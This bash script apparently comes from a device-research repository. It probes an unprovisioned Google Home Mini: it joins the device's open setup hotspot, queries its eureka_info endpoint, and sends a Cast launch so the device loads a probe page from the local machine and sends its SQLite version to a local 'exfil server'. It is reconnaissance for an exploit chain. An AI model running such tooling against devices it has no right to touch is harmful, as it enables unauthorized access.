#!/usr/bin/env bash
# Probe the Mini's SQLite/Chromium version WITHOUT provisioning it.
#
# The device's setup hotspot is open (no PSK).  When you join it, the device
# is reachable at 192.168.255.249 (HTTPS:8443, HTTP:8008, Cast:8009).
# This script:
#   1. Joins the setup hotspot.
#   2. Queries eureka_info with extended params (including build_info).
#   3. Sends a Cast LAUNCH to port 8009 pointing at probe.html on THIS machine.
#   4. probe.html WebSQL queries report the SQLite version back to us.
#   5. Restores the previous Wi-Fi connection.
#
# Requirements:
#   nmcli, python3, pychromecast or reconstruction/exploit/magellan/cast_launch.py
#
# Usage:
#   bash scripts/probe-on-hotspot.sh [--pi-ip <ip>] [--skip-launch]
#   # --pi-ip: IP of THIS machine on the hotspot (default auto-detect)
#   # --skip-launch: only query eureka_info, no Cast probe

set -euo pipefail

PI_IP=""
SKIP_LAUNCH=0
while [[ $# -gt 0 ]]; do
  case "$1" in
    --pi-ip) PI_IP="$2"; shift 2 ;;
    --skip-launch) SKIP_LAUNCH=1; shift ;;
    *) echo "Unknown arg: $1"; exit 1 ;;
  esac
done

DEVICE_IP="192.168.255.249"
PROF="gh-probe-$$"
PREV_CON=$(nmcli -t -f NAME,TYPE con show --active 2>/dev/null \
           | awk -F: '$2=="802-11-wireless"{print $1;exit}')

cleanup() {
  echo "[*] Restoring Wi-Fi..."
  nmcli con down "$PROF" 2>/dev/null || true
  nmcli con delete "$PROF" 2>/dev/null || true
  [[ -n "$PREV_CON" ]] && nmcli con up "$PREV_CON" 2>/dev/null || true
}
trap cleanup EXIT

# ── 1. Find and join the setup hotspot ──────────────────────────────────────
echo "[*] Scanning for setup AP..."
SETUP_SSID=$(nmcli -t -f SSID,SECURITY dev wifi list 2>/dev/null \
  | awk -F: 'tolower($1) ~ /^googlehome|^chromecast|^nest/ && ($2=="" || $2=="--") {print $1; exit}')

if [[ -z "$SETUP_SSID" ]]; then
  echo "[!] No open Google setup AP found. Is the Mini powered on and unprovisioned?"
  exit 1
fi
echo "[*] Setup AP: '$SETUP_SSID'"

nmcli con add type wifi con-name "$PROF" ssid "$SETUP_SSID" autoconnect no \
  2>/dev/null || true
nmcli con modify "$PROF" ipv4.method auto ipv6.method ignore
nmcli con up "$PROF" 2>/dev/null | grep -q "successfully activated" \
  || { echo "[!] Could not join setup AP"; exit 2; }

# Wait for IP
for i in $(seq 1 15); do
  GW=$(ip route show 0.0.0.0/0 2>/dev/null | awk '{print $3; exit}')
  [[ -n "$GW" ]] && break
  sleep 1
done
MY_IP=$(ip -4 -o addr show scope global 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -1)
echo "[*] Joined. My IP: ${MY_IP:-unknown}  Gateway: ${GW:-unknown}"
[[ -z "$PI_IP" ]] && PI_IP="${MY_IP:-192.168.255.1}"

# ── 2. Query eureka_info with build_info param ───────────────────────────────
echo ""
echo "=== eureka_info (extended) ==="
curl -sk "https://${DEVICE_IP}:8443/setup/eureka_info?params=build_info,device_info" \
  | python3 -m json.tool 2>/dev/null | grep -E "build|chrome|version|date|model|product" || true

echo ""
echo "=== eureka_info (sign.certificate — may contain build date) ==="
curl -sk "https://${DEVICE_IP}:8443/setup/eureka_info?params=sign" \
  | python3 -m json.tool 2>/dev/null | head -30 || true

# ── 3. Patch probe.html with our IP and start exfil server ──────────────────
if [[ "$SKIP_LAUNCH" -eq 0 ]]; then
  SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
  MAGELLAN_DIR="$SCRIPT_DIR/../reconstruction/exploit/magellan"
  PROBE="$MAGELLAN_DIR/probe.html"

  # Patch PI_IP_PLACEHOLDER in probe.html
  sed -i "s/PI_IP_PLACEHOLDER/${PI_IP}/g" "$PROBE" 2>/dev/null || true

  echo ""
  echo "[*] Starting exfil + page server in background (port 8080/8081)..."
  python3 "$MAGELLAN_DIR/exfil_server.py" --ip "$PI_IP" &
  EXFIL_PID=$!
  sleep 1

  echo "[*] Sending Cast LAUNCH to ${DEVICE_IP}:8009 → probe.html"
  python3 "$MAGELLAN_DIR/cast_launch.py" \
      "$DEVICE_IP" "http://${PI_IP}:8080/probe.html" || true

  echo ""
  echo "[*] Waiting 20s for the device to fetch and run probe.html..."
  sleep 20

  kill "$EXFIL_PID" 2>/dev/null || true
  echo "[*] Done. Check evidence/ for magellan-exfil-*.json"
fi
